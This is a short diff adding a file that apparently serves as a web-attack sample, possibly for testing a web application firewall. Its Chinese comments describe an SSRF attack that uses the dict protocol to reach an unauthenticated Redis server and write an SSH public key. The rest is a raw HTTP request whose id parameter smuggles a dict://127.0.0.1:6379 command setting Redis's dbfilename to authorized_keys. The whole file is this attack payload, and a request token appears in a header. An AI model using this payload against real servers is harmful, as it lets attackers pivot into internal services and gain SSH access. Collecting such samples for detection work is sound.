@@ -1,0 +1,9 @@
+# SSRF服务端请求伪造_DICT协议_写入ssh公钥
+# 利用dict协议攻击未授权redis服务，通过redis未授权写入ssh公钥
+GET /?id=dict:%2F%2F127.0.0.1:6379%2Fconfig:set:dbfilename:authorized_keys&bid=hd_tag_m8mv25iv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25iv
+RM-PRO-Token: 8f570a1f818a505d8f63ef61055bb18f
+RM-PRO-Time: 1742808471536
+User-Agent: curl/7.83.1
+
